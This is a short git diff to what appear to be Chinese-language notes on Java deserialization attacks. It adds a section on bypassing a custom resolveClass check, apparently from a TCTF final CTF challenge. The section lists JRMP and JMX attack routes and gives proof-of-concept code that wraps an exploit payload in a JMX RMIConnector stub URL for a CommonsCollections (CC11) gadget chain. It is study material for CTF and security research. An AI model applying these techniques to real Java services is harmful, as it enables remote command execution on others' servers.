@@ -261,3 +261,27 @@ PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanCla
 漏洞服务器反序列化该payload后，会去连接攻击者开启的rmi监听，在通信过程中，攻击者服务器会发送一个可执行命令的payload
 （假如存在漏洞的服务器中有使用org.apacje.commons.collections包，则可以发送CommonsCollections系列的payload），从而达到命令执行的结果。
 ```
+
+### 绕过 resolveClass方法的this.classLoader.loadClass
+参考tctf finaly buggyloadercode
+
+```java
+protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+        Class clazz = this.classLoader.loadClass(desc.getName());
+        return clazz;
+        //return super.resolveClass(desc);
+    }
+    
+------------
+1. 通过jrmp去打 要求出网
+2. 通过jmx去打
+poc配合cc11
+
+JMXServiceURL jurl = new JMXServiceURL("service:jmx:rmi:///stub/" + Temp.getExp());//jmx协议
+Map hashMapp = new HashMap();
+RMIConnector rc = new RMIConnector(jurl,hashMapp);
+
+String finalExp = "service:jmx:rmi:///stub/" + Temp.getExp();//jmx协议
+RMIConnector rmiConnector = new RMIConnector(new JMXServiceURL(finalExp), new HashMap<>());//jmx连接
+
+```
